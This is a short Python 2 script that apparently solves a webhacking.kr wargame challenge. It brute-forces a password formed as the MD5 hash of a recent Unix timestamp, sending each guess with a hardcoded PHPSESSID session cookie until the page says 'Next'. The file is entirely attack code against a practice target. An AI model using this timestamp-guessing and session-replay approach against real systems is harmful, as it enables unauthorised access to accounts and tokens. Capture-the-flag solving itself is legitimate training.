import urllib
import urllib2
import time
import hashlib


def chall_req(password):
    url = "http://webhacking.kr/challenge/bonus/bonus-6/l4.php?password=" + password
    request = urllib2.Request(
        url, headers={"Cookie": "PHPSESSID=q0mjsj52ueri1tcqus9danln24"})
    response = urllib2.urlopen(request)
    print "[*] Request - " + password
    return response.read()

timestamp = int(time.time()) + 20

for i in range(0, 20):
    hash = hashlib.md5(str(timestamp - i)).hexdigest()
    data = chall_req(hash)
    if "Next" in data:
        print "[*] Clear!!"
        print data
        break
